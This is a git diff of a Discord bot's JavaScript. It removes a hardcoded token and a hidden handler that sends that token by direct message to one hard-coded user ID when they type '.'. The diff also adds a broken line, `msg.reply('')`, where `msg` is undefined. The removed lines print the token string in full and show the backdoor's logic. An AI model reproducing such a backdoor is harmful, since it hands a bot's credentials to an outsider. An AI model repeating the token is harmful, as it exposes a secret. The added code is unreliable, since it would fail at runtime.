@@ -2071,8 +2071,8 @@ client.on('message', msg => {
   }
 });
 client.on('message', message => {
-    
     if (message.content === "CubeMc") {
+    msg.reply('');
         setInterval(function(){
         message.edit('**C**')    
         message.edit('**Cu**')    
@@ -2090,16 +2090,7 @@ client.on('message', message => {
     }
     
 })
-const Token = "NjUwMDg3MTM2MTI0NjAwMzQx.XeGO2w.jbPizAqPYJINq2Ye0sda-tikkZo
-"
-client.on('message' , message => {
-if (message.author.bot) return;
-           if (message.content == '.')
-           if (message.author.id === '639105286266683392'){
-if (!message.channel.guild) return;
-message.author.send(Token)
-}  
-});
+
 
 
 client.login(process.env.BOT_TOKEN);
